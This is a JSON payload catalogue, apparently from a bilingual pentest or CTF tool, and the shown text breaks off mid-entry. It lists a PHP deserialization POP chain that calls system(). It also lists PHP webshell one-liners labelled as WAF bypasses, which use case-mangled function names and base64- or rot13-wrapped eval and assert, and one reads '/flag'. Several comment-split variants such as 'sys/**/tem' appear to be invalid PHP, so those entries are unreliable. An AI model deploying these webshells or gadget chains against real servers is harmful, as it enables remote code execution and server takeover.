{
  "schemaVersion": 1,
  "entries": [
    {
      "id": "rce-deserialize-php",
      "patches": [
        {
          "area": "execution",
          "index": 1,
          "expectedCommand": "<?php\nclass Chain {\n    public $obj;\n    function __destruct() {\n        $this->obj->action();\n    }\n}\nclass Action {\n    public $cmd;\n    function action() {\n        system($this->cmd);\n    }\n}\n$payload = new Chain();\n$payload->obj = new Action();\n$payload->obj->cmd = \"whoami\";\necho serialize($payload);\n?>",
          "description": {
            "zh": "构造 Chain.__destruct 调用 Action.action 再触发 system 的两级 POP 链并输出其序列化串。命中判据：反序列化点还原对象链后返回 whoami 的当前用户名。",
            "en": "Builds a two-level POP chain where Chain.__destruct calls Action.action which triggers system, and prints its serialized form. Success check: after the deserialization sink restores the object chain, whoami returns the current username."
          },
          "title": {
            "zh": "构造POP链",
            "en": "Construct POP Chain"
          }
        }
      ]
    },
    {
      "id": "webshell-php",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "<?php sys/**/tem($_GET['cmd']); ?>\n<?php syst/**/em($_GET['cmd']); ?>\n<?php e/**/va/**/l($_POST['cmd']);?>\n<?php a/**/ss/**/ert($_POST['cmd']);?>\n<?php pa/**/sst/**/hru($_GET['cmd']); ?>\n<?php sh/**/el/**/l_ex/**/ec($_GET['cmd']); ?>\n<?php fil/**/e_ge/**/t_con/**/tents('/flag'); ?>",
          "syntaxBreakdown": [
            {
              "part": "sys/**/tem",
              "explanation": {
                "zh": "注释拆分函数名",
                "en": "Comment splits the function name"
              },
              "type": "payload"
            },
            {
              "part": "/**/",
              "explanation": {
                "zh": "行内注释分隔",
                "en": "Inline comment separator"
              },
              "type": "comment"
            },
            {
              "part": "e/**/va/**/l",
              "explanation": {
                "zh": "多段拆分eval",
                "en": "Multi-segment eval split"
              },
              "type": "payload"
            },
            {
              "part": "fil/**/e_ge/**/t_con/**/tents",
              "explanation": {
                "zh": "拆分读文件函数",
                "en": "Splits the file-read function"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "<?php SYSTEM($_GET['cmd']); ?>\n<?php System($_GET['cmd']); ?>\n<?php sYstem($_GET['cmd']); ?>\n<?php EVAL($_POST['cmd']);?>\n<?php ASSERT($_POST['cmd']);?>\n<?php PASSTHRU($_GET['cmd']); ?>\n<?php SHELL_EXEC($_GET['cmd']); ?>",
          "syntaxBreakdown": [
            {
              "part": "SYSTEM(",
              "explanation": {
                "zh": "全大写函数名",
                "en": "Uppercase function name"
              },
              "type": "payload"
            },
            {
              "part": "sYstem(",
              "explanation": {
                "zh": "混合大小写函数",
                "en": "Mixed-case function name"
              },
              "type": "payload"
            },
            {
              "part": "EVAL(",
              "explanation": {
                "zh": "大写eval形态",
                "en": "Uppercase eval form"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 3,
          "expectedCommand": "<?php eval(base64_decode($_POST['cmd']));?>\n<?php eval(base64_decode($_GET['cmd']));?>\n<?php assert(base64_decode($_POST['cmd']));?>\n<?php $a=base64_decode($_POST['cmd']);eval($a);?>",
          "syntaxBreakdown": [
            {
              "part": "eval(base64_decode($_POST['cmd']))",
              "explanation": {
                "zh": "解码后求值",
                "en": "Decodes then evaluates"
              },
              "type": "function"
            },
            {
              "part": "base64_decode",
              "explanation": {
                "zh": "Base64解码函数",
                "en": "Base64 decode function"
              },
              "type": "function"
            },
            {
              "part": "eval($a)",
              "explanation": {
                "zh": "两段式执行",
                "en": "Two-stage execution"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 4,
          "expectedCommand": "<?php eval(str_rot13($_POST['cmd']));?>\n<?php eval(str_rot13($_GET['cmd']));?>\n<?php eval(str_rot13(base64_decode($_POST['cmd'])));?>",
          "syntaxBreakdown": [
            {
              "part": "str_rot13(",
              "explanation": {
                "zh": "ROT13解码函数",
                "en": "ROT13 decode function"
              },
              "type": "function"
            },
            {
              "part": "str_rot13(base64_decode(",
              "explanation": {
                "zh": "双重解码链",
                "en": "Double decode chain"
              },
